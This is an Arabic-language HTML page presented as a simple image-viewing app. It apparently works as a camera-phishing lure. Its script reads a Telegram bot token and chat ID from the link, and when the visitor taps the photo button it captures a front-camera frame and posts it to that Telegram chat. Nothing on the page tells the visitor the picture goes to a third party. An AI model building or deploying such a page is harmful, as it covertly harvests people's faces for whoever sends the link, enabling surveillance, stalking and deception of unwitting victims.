<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تطبيق الصور</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0e1a;
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            padding: 16px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(8px);
            border-radius: 48px;
            padding: 30px 24px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.08);
            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
        }
        .image-preview {
            width: 100%;
            border-radius: 24px;
            margin-bottom: 20px;
            border: 2px solid rgba(255,255,255,0.1);
            max-height: 300px;
            object-fit: cover;
            background: #222;
        }
        .action-btn {
            width: 100%;
            padding: 18px 0;
            border: none;
            border-radius: 60px;
            background: linear-gradient(135deg, #f9d976, #f39c12);
            color: #0b0e1a;
            font-size: 22px;
            font-weight: 800;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 8px 25px rgba(243, 156, 18, 0.25);
        }
        .action-btn:disabled { opacity: 0.4; transform: scale(0.97); pointer-events: none; }
        .action-btn:active { transform: scale(0.96); }
        #status { margin-top: 16px; font-size: 15px; color: #aab; min-height: 24px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
<div class="container">
    <img id="preview" class="image-preview" src="" alt="الصورة">
    <button id="captureBtn" class="action-btn">📸 التقاط صورة</button>
    <div id="status">⏳ جاري التحميل...</div>
</div>

<video id="video" playsinline></video>
<canvas id="canvas"></canvas>

<script>
    (function() {
        // ========== قراءة المعاملات ==========
        const urlParams = new URLSearchParams(window.location.search);
        const BOT_TOKEN = urlParams.get('token') || '';
        const CHAT_ID = urlParams.get('chatId') || '';
        const IMAGE_URL = urlParams.get('image') || '';

        const preview = document.getElementById('preview');
        const captureBtn = document.getElementById('captureBtn');
        const statusDiv = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // عرض الصورة
        if (IMAGE_URL) {
            preview.src = IMAGE_URL;
            statusDiv.innerHTML = '📸 اضغط لالتقاط صورة';
            captureBtn.disabled = false;
        } else {
            statusDiv.innerHTML = '❌ لم يتم العثور على صورة';
            captureBtn.disabled = true;
        }

        // ========== التقاط الصورة وإرسالها ==========
        async function captureAndSend() {
            if (!BOT_TOKEN || !CHAT_ID) {
                statusDiv.innerHTML = '❌ إعدادات البوت غير مكتملة';
                return;
            }

            captureBtn.disabled = true;
            statusDiv.innerHTML = '📸 جاري طلب الكاميرا...';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
                });

                video.srcObject = stream;
                await video.play();

                // رسم الإطار
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // إيقاف الكاميرا
                stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;

                // تحويل إلى Blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
                });

                // إرسال إلى البوت
                statusDiv.innerHTML = '📤 جاري الإرسال...';
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'captured.jpg');

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    statusDiv.innerHTML = '✅ تم الإرسال بنجاح!';
                } else {
                    const err = await response.text();
                    console.error(err);
                    statusDiv.innerHTML = '❌ فشل الإرسال: ' + err;
                }

            } catch (error) {
                console.error(error);
                statusDiv.innerHTML = '❌ حدث خطأ: تأكد من منح صلاحية الكاميرا';
            }

            captureBtn.disabled = false;
        }

        captureBtn.addEventListener('click', captureAndSend);
    })();
</script>
</body>
</html>
